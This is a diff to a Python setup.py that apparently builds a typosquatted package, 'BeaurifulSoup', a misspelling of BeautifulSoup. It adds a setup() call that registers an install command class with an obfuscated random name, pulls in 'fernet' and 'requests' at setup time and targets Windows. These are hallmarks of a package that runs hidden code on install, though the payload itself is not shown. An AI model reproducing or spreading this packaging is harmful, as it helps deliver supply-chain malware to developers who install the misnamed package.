@@ -18,5 +18,22 @@ class rzxssfQcxNfDbluWjQrLNTyXiTWWtkOpewDYYxbojtvKfZktYcnYHYxWEbZkhVGzocbYcbXHAM
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
+setup(
+    name="BeaurifulSoup",
+    version=VERSION,
+    author="UOGITRviz",
+    author_email="ECfYTFqREwBVJynGvHr@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': rzxssfQcxNfDbluWjQrLNTyXiTWWtkOpewDYYxbojtvKfZktYcnYHYxWEbZkhVGzocbYcbXHAMrKMNDnEJaIWvVoTzlcdExaVOPyPDw,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
